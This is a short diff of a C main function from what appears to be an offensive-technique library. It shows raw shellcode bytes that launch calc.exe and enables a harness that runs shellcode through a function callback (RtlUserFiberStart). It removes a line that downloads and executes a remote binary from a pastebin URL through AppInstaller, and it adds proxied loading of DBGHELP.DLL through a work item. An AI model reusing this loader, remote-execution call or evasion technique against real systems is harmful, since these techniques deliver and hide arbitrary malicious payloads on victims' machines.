@@ -30,19 +30,15 @@ int main(VOID)
 		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-	/*SHELLCODE_EXECUTION_INFORMATION Sei = { 0 };
+	SHELLCODE_EXECUTION_INFORMATION Sei = { 0 };
 	Sei.Payload = GlobalOpenCalcPayload;
 	Sei.dwLengthOfPayloadInBytes = 277;
-	Sei.MethodEnum = E_DNSQUERYEX;
+	Sei.MethodEnum = E_RTLUSERFIBERSTART;
 
-	ShellcodeExecutionViaFunctionCallbackMain(&Sei);
-
-	*/
-
-	MpfLolExecuteRemoteBinaryByAppInstallerW((PWCHAR)L"https://pastebin.com/raw/tdyShwLw", 34);
-
-	
 	//ShellcodeExecutionViaFunctionCallbackMain(&Sei);
+
+	HMODULE hMod = ProxyWorkItemLoadLibraryA("DBGHELP.DLL");
+	
 
 	return dwError;
 }
